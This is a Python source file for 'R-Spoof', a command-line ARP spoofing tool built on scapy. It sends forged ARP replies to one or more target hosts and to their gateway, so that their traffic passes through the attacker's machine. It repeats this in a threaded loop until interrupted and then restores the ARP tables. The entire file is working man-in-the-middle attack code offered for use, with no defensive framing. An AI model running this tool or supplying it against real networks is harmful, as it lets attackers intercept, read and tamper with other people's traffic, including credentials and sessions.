print("""
 /$$$$$$$           /$$$$$$                                 /$$$$$$ 
| $$__  $$         /$$__  $$                               /$$__  $$
| $$  \ $$        | $$  \__/  /$$$$$$   /$$$$$$   /$$$$$$ | $$  \__/
| $$$$$$$/ /$$$$$$|  $$$$$$  /$$__  $$ /$$__  $$ /$$__  $$| $$$$    
| $$__  $$|______/ \____  $$| $$  \ $$| $$  \ $$| $$  \ $$| $$_/    
| $$  \ $$         /$$  \ $$| $$  | $$| $$  | $$| $$  | $$| $$      
| $$  | $$        |  $$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/| $$      
|__/  |__/         \______/ | $$____/  \______/  \______/ |__/      
                            | $$                                    
                            | $$                                    
                            |__/                                    
====================================================================
[*] R-Spoof | ARP Spoofer | Afrizal F.A - R&D ICWR
====================================================================
""")

import time, argparse
import scapy.all as scapy
from concurrent.futures import ThreadPoolExecutor as T

class ARPSpoof:

    def mac(self, ip):
        
        try:

            mac = scapy.srp(scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst = ip), timeout = 5, verbose = False)[0]
            result = mac[0][1].hwsrc
            
        except Exception as E:
            
            print("[-] [Error: {}]".format(E))
            result = False

        return result

    def spoof(self, target, gateway):
        
        target_list = target.split(",")
        
        for target in target_list:
        
            try:

                packet = scapy.ARP(op = 2, pdst = target, hwdst = self.mac(target), psrc = gateway)
                scapy.send(packet, verbose = False)
                
                packet = scapy.ARP(op = 2, pdst = gateway, hwdst = self.mac(gateway), psrc = target)
                scapy.send(packet, verbose = False)
                
                print("[+] [Sent Packet to Target {} With Gateway {}]".format(target, gateway))
                
            except Exception as E:
                
                print("[-] [Error: {}]".format(E))

    def restore(self, target, gateway):
        
        target_list = target.split(",")
        
        for target in target_list:
        
            try:

                packet = scapy.ARP(op = 2, pdst = gateway, hwdst = self.mac(gateway), psrc = target, hwsrc = self.mac(target))
                scapy.send(packet, verbose = False)
                
                packet = scapy.ARP(op = 2, pdst = target, hwdst = self.mac(target), psrc = gateway, hwsrc = self.mac(gateway))
                scapy.send(packet, verbose = False)
                
            except Exception as E:
                
                print("[-] [Error: {}]".format(E))
                self.restore(target, gateway)
        
    def proc(self):
        
        
        parser = argparse.ArgumentParser()
        parser.add_argument("-x", "--target", required = True, help = "Terget IP ( Multiple Target Using \",\" Example : 192.168.1.1,192.168.1.2 )", type = str)
        parser.add_argument("-g", "--gateway", required = True, help = "Gateway IP", type = str)
        parser.add_argument("-d", "--delay", required = True, help = "Delay ( Per Second )", type = int)
        parser.add_argument("-t", "--thread", required = True, help = "Thread", type = int)
        args = parser.parse_args()
        
        while (True):
            
            try:
            
                T(max_workers = args.thread).submit(self.spoof, args.target, args.gateway)
                time.sleep(args.delay)
                
            except KeyboardInterrupt:
                
                self.restore(args.target, args.gateway)
                print("[!] [Exiting...]")
                break
                
        exit()
        
    def __init__(self):

        self.proc()

ARPSpoof() if __name__ == "__main__" else exit()
